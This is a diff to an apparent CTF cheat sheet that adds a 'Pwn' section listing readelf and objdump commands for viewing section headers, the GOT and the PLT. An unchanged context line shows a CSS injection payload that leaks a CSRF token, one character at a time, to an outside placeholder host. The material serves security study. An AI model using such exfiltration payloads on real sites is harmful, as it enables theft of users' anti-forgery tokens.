@@ -176,3 +176,15 @@
   input[name=csrf][value^="2e"]{background:url(http://ip/2e)} O
   ...
   ```
+
+
+## Pwn
+
+
+### Section
+* `$ readelf -S <binary>`
+  > section header
+* `$ objdump -R <binary>`
+  > got table
+* `$ objdump -d <binary>`
+  > plt table
